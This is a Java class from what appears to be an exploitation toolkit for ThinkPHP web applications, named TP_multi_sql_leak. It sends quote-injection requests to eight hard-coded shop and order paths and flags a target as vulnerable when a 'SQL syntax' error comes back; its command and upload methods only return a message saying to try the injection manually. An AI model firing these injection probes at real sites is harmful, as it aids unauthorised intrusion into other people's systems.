package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;

import java.time.LocalTime;
import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP_multi_sql_leak implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();
    private String results = null;
    private final String[] paths = new String[]{"/index.php?s=/home/shopcart/getPricetotal/tag/1%27", "/index.php?s=/home/shopcart/getpriceNum/id/1%27", "/index.php?s=/home/user/cut/id/1%27", "/index.php?s=/home/service/index/id/1%27", "/index.php?s=/home/pay/chongzhi/orderid/1%27", "/index.php?s=/home/order/complete/id/1%27", "/index.php?s=/home/order/detail/id/1%27", "/index.php?s=/home/order/cancel/id/1%27"};


    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        String[] var2 = this.paths;
        int var3 = var2.length;

        for(int var4 = 0; var4 < var3; ++var4) {
            String path = var2[var4];
            Response response = HttpTools.get(url + path, this.headers, "UTF-8");
            if (response.getText().contains("SQL syntax")) {
                this.results = "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞";
                return this.results;
            }

            if (response.getError() != null) {
                this.results = "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
                return this.results;
            }
        }

        this.results = "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        return this.results;
    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        return "这是一个sql注入漏洞，请自行尝试\r\n";
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        String result = exeCmd("@print(realpath(__ROOT__))", "UTF-8");
        return result;
    }

    @Override
    public String uploadFile(String content, String fileName, String platform) throws Exception {
        return "这是一个sql注入漏洞，请自行尝试\r\n";
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
